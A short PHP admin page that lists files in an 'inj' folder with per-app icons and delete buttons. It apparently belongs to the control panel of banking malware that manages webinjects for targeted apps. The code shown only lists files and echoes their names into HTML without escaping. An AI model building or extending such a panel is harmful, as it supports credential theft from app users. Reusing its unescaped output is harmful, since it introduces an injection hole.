<?php session_start();
include '../db.php';
include '../crypt.php';
include 'func.php';
if (!(isset($_SESSION['user_id']))){
    header("Location: ../index.php"); 
    return; 
}  
?>
<?php
if ($_GET['sort'] == ""){
    $sort = 'info2';
}
else{
    $sort = $mysqli->real_escape_string($_GET['sort']);
}
$apps_ar = array();

# get inject list
//$inj_list = "";
$files = scandir('../inj');
foreach ($files as $file) {
	if (($file != ".") and ($file != "..") and ($file != "") and ($file != "go.php") and ($file != ".htaccess") and ($file != "index.html")){
		//$inj_list .= "$file\n";
		array_push($apps_ar, $file);
	}
}
$total = count($apps_ar);

$html = '';
$html_table = '';

foreach($apps_ar as $app){
    $html_table .= "<tr>";
    $html_table .= "<td><img src='../icon/$app.png' width='75px'></td>";
    $html_table .= "<td>$app</td>";
    $html_table .= "<td><a style='cursor: pointer; color: Red;' onclick='delete_inject(\"$app\")'><i class='material-icons'>highlight_off</i></a></td></tr>";
}

$html = file_get_contents("templates/injectlist.tpl");
$html = str_replace('%%PLACE_TOTAL_ITEMS_HERE%%', $total, $html);
$html = str_replace('%%PLACE_TABLE_HERE%%', $html_table, $html);

echo $html;
?>
